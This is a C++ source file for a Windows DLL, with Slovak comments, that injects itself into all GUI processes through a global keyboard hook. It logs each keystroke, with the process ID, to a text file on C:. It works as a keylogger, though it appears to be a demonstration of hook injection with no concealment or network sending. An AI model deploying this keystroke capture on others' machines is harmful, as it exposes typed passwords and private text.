#include "stdafx.h"
#include <StrSafe.h>
#include "HookInjectionDLL.h"
//------------------------------------------------------------------------------
#pragma  data_seg("MYSHARED")
// Musi byt zdielana premenna aby bola zdielana medzi aplikaciou, ktora INSTALUJE HOOK (HookInjectionEXE.EXE) a samotnou HOOK DLL, ktora sa HOOKNE na ostatne GUI aplikacie.
HHOOK				MHookHandle=NULL;
bool				MUseFilter=false;
#pragma data_seg()
#pragma comment(linker, "/section:MYSHARED,RWS")
//------------------------------------------------------------------------------
HMODULE				MDLLHandle=NULL;
//------------------------------------------------------------------------------
void WriteToFile(wchar_t* Text)
{
	const int		CHARS=1024;
	wchar_t			Buffer[CHARS];

	StringCchPrintf(Buffer,CHARS,L"PID: [%d] - Text: [%s] !\r\n",GetCurrentProcessId(),Text);

	size_t			StringSize=0;

	StringCchLength(Buffer,CHARS,&StringSize);

	HANDLE			Handle=CreateFile(L"C:\\HookInjection.txt",GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

	if (Handle!=INVALID_HANDLE_VALUE)
	{
		SetFilePointer(Handle,0,NULL,FILE_END);

		DWORD		NumberOfBytesWritten=0;

		// !!! NumberOfBytesWritten NESMIE BYT NULL vo WriteFile() - inak to CELE ZBLBNE.
		WriteFile(Handle,(void*) Buffer,StringSize*sizeof(wchar_t),&NumberOfBytesWritten,NULL);

		CloseHandle(Handle);
	}
}
//------------------------------------------------------------------------------
void WriteLogToFile(int Code, WPARAM WParam, LPARAM LParam)
{
	const int		CHARS=1024;
	wchar_t			Buffer[CHARS];

	StringCchPrintf(Buffer,CHARS,L"PID: [%d] - Code: [%d], WParam: [%d], LParam: [%d] !\r\n",GetCurrentProcessId(),Code,WParam,LParam);

	size_t			StringSize=0;

	StringCchLength(Buffer,CHARS,&StringSize);

	HANDLE			Handle=CreateFile(L"C:\\HookInjection.txt",GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

	if (Handle!=INVALID_HANDLE_VALUE)
	{
		SetFilePointer(Handle,0,NULL,FILE_END);

		DWORD		NumberOfBytesWritten=0;

		// !!! NumberOfBytesWritten NESMIE BYT NULL vo WriteFile() - inak to CELE ZBLBNE.
		WriteFile(Handle,(void*) Buffer,StringSize*sizeof(wchar_t),&NumberOfBytesWritten,NULL);

		CloseHandle(Handle);
	}
}
//------------------------------------------------------------------------------
void WriteKeyLogToFile(WPARAM WParam, LPARAM LParam)
{
	const int		CHARS=1024;
	wchar_t			Buffer[CHARS];

	// Ignore KEY_UP.
	if ((LParam & (1<<31))!=0)
		return;

	UINT			CharValue=MapVirtualKey(WParam,MAPVK_VK_TO_CHAR);

	if (CharValue!=0)
		StringCchPrintf(Buffer,CHARS,L"PID: [%d] - Char: [%c], LParam: [%d] !\r\n",GetCurrentProcessId(),CharValue,LParam);
	else
		StringCchPrintf(Buffer,CHARS,L"PID: [%d] - Key: [%d], LParam: [%d] !\r\n",GetCurrentProcessId(),WParam,LParam);

	//StringCchPrintf(Buffer,CHARS,L"PID: [%d] - WParam: [%d], LParam: [%d] !\r\n",GetCurrentProcessId(),WParam,LParam);

	size_t			StringSize=0;

	StringCchLength(Buffer,CHARS,&StringSize);

	HANDLE			Handle=CreateFile(L"C:\\HookInjection.txt",GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

	if (Handle!=INVALID_HANDLE_VALUE)
	{
		SetFilePointer(Handle,0,NULL,FILE_END);

		DWORD		NumberOfBytesWritten=0;

		// !!! NumberOfBytesWritten NESMIE BYT NULL vo WriteFile() - inak to CELE ZBLBNE.
		WriteFile(Handle,(void*) Buffer,StringSize*sizeof(wchar_t),&NumberOfBytesWritten,NULL);

		CloseHandle(Handle);
	}
}
//------------------------------------------------------------------------------
// Tato funkcia je volana v HOOKED procese.
LRESULT CALLBACK HookKeyboardProc(int Code, WPARAM WParam, LPARAM LParam)
{
	if (Code<0)
		return(CallNextHookEx(MHookHandle,Code,WParam,LParam));
	else
	{
		if (MUseFilter==false)
		{
			WriteLogToFile(Code,WParam,LParam);
		}
		else
		{
			if (Code==HC_ACTION)
				WriteKeyLogToFile(WParam,LParam);
		}

		HHOOK			Hook=MHookHandle;

		if (Hook==NULL)
			WriteToFile(L"Hook is NULL !\r\n");

		LRESULT			Result=CallNextHookEx(Hook,Code,WParam,LParam);

		return(Result);
	}
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
// Tato funkcia je volana v procese HookInjectionEXE.EXE.
HOOKINJECTIONDLL_API bool InstallHook(HHOOK* PHook, bool UseFilter)
{
	const int		CHARS=1024;
	wchar_t			Buffer[CHARS];

	MUseFilter=UseFilter;

	*PHook=MHookHandle=SetWindowsHookEx(WH_KEYBOARD,HookKeyboardProc,MDLLHandle,0);

	if (MHookHandle!=NULL)
	{
		StringCchPrintf(Buffer,CHARS,L"Hook: [%d] INSTALLED !",MHookHandle);
		WriteToFile(Buffer);
		return(true);
	}
	else
	{
		WriteToFile(L"Hook FAILED to INSTALL !");
		return(false);
	}
}
//------------------------------------------------------------------------------
// Tato funkcia je volana v procese HookInjectionEXE.EXE.
HOOKINJECTIONDLL_API bool UninstallHook(void)
{
	const int		CHARS=1024;
	wchar_t			Buffer[CHARS];

	if (MHookHandle!=NULL)
	{
		if (UnhookWindowsHookEx(MHookHandle)==TRUE)
		{
			StringCchPrintf(Buffer,CHARS,L"Hook: [%d] was UNINSTALLED !",MHookHandle);
			WriteToFile(Buffer);
			return(true);
		}
		else
		{
			StringCchPrintf(Buffer,CHARS,L"Hook: [%d] was NOT UNINSTALLED !",MHookHandle);
			WriteToFile(Buffer);
			return(false);
		}
	}
	else
	{
		WriteToFile(L"Hook DOESN'T EXIST !");
		return(false);
	}
}
//------------------------------------------------------------------------------